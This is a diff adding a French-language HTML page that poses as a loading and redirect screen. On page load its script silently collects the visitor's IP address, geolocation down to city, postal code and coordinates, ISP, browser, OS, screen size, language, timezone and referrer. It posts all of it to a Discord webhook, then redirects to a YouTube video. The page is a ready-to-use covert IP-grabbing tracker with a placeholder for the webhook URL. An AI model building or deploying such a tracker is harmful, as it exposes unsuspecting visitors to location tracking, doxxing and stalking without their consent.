@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Chargement...</title>
+  <style>
+    body, html { margin:0; padding:0; height:100%; background:#000; color:#fff; font-family:Arial; display:flex; justify-content:center; align-items:center; }
+    .loader { text-align:center; }
+    .spinner { border:5px solid #333; border-top:5px solid #09f; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 20px; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Redirection en cours...</p>
+  </div>
+
+  <script>
+    // === CONFIG ===
+    const WEBHOOK_URL = "TON_WEBHOOK_DISCORD_ICI"; // ← COLLE TON URL ICI
+    const REDIRECT_URL = "https://youtu.be/dQw4w9WgXcQ"; // ← Change ici
+    const DELAY = 1000; // 1 seconde avant redirection
+
+    // === RÉCUPÈRE TOUTES LES INFOS ===
+    async function getGeo(ip) {
+      try {
+        const res = await fetch(`https://ip-api.com/json/${ip}?fields=66846719`);
+        return await res.json();
+      } catch { return {}; }
+    }
+
+    async function logVisit() {
+      const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
+      const geo = await getGeo(ip);
+      const ua = navigator.userAgent;
+      const bot = /bot|googlebot|crawler|spider|robot|crawling/i.test(ua);
+
+      const data = {
+        content: "**NOUVEAU CLIC DÉTECTÉ !**",
+        embeds: [{
+          title: "Détails du visiteur",
+          color: 0x00ff00,
+          fields: [
+            { name: "IP", value: ip, inline: true },
+            { name: "IP Anonymisée", value: ip.replace(/\.\d+$/, ".xxx"), inline: true },
+            { name: "ISP", value: geo.isp || "Inconnu", inline: true },
+            { name: "Pays", value: `${geo.country || "??"} (${geo.countryCode || "?"})`, inline: true },
+            { name: "Région / Ville", value: `${geo.regionName || "?"} / ${geo.city || "?"}`, inline: true },
+            { name: "Code postal", value: geo.zip || "?", inline: true },
+            { name: "Coordonnées", value: `${geo.lat || "?"}°, ${geo.lon || "?"}°`, inline: true },
+            { name: "Navigateur", value: ua.match(/Chrome|Firefox|Safari|Edge/i)?.[0] || "Inconnu", inline: true },
+            { name: "OS", value: ua.match(/Windows|Android|iPhone|Mac|Linux/i)?.[0] || "Inconnu", inline: true },
+            { name: "Appareil", value: /Mobile|iPhone|iPad|Android/.test(ua) ? "Mobile" : "PC/Tablette", inline: true },
+            { name: "Écran", value: `${screen.width}x${screen.height}`, inline: true },
+            { name: "Langue", value: navigator.language || "?", inline: true },
+            { name: "Fuseau", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+            { name: "Heure (locale)", value: new Date().toLocaleString('fr-FR'), inline: true },
+            { name: "Référent", value: document.referrer || "Direct", inline: false },
+            { name: "Bot ?", value: bot ? "Oui" : "Non", inline: true },
+            { name: "Lien cible", value: REDIRECT_URL, inline: false }
+          ],
+          timestamp: new Date().toISOString(),
+          footer: { text: "Tracker MAX • GitHub Pages" }
+        }]
+      };
+
+      // Envoie sur Discord
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+
+      // Redirection après délai
+      setTimeout(() => { window.location.href = REDIRECT_URL; }, DELAY);
+    }
+
+    // Démarre
+    logVisit();
+  </script>
+</body>
+</html>
